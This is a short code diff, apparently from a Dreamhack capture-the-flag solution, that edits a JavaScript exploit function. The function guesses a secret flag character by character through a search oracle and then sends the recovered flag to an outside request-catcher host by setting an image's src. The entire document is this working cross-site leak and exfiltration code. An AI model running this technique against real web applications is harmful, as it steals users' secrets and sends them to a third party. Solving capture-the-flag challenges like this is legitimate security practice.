@@ -25,20 +25,19 @@
         }
     }
 
-    function exploit() {
-
-        let chars = "[0123456789abcdef]{32}"
+    async function exploit() {
+        let chars = "0123456789abcdefABCDEF}"
         let secret = "DH{";
 
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
-                    secret += c
-                    img.src = `https://vgwdxkj.request.dreamhack.games/${secret}`
+                    secret += c;
                     break;
                 }
             }
         }
+        img.src = `https://fmcgllf.request.dreamhack.games/${secret}`;
     }
 
     exploit();
